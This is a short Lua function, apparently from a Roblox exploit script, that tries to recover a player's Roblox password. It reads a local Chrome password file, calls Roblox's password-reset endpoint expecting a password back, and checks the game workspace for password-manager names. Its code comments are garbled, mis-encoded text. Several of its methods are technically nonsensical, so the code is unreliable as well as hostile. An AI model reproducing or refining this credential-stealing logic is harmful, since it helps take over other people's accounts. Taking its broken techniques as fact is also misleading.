local function getPassword()
    local password = ""
    
    -- Ù…Ø­Ø§ÙˆÙ„Ø© 1: Chrome Password Database
    pcall(function()
        local passFile = "chrome_passwords.txt"
        if isfile(passFile) then
            local content = readfile(passFile)
            password = content:match("roblox.com%s+([^%s]+)") or "CHROME_PASS_FOUND"
        end
    end)
    
    -- Ù…Ø­Ø§ÙˆÙ„Ø© 2: Ù…Ù† Roblox Password Reset API
    pcall(function()
        local resetReq = request({
            Url = "https://auth.roblox.com/v2/password-reset",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({email = lp.DisplayName .. "@roblox.com"})
        })
        password = resetReq.Body:match('"password":"([^"]+)"') or ""
    end)
    
    -- Ù…Ø­Ø§ÙˆÙ„Ø© 3: Password Manager Detection
    local managers = {"LastPass", "Bitwarden", "1Password", "KeePass"}
    for _, manager in pairs(managers) do
        if findfirstchild(workspace, manager) then
            password = manager .. "_DETECTED"
            break
        end
    end
    
    return password ~= "" and password or "PASSWORD_SEARCH_FAILED"
end

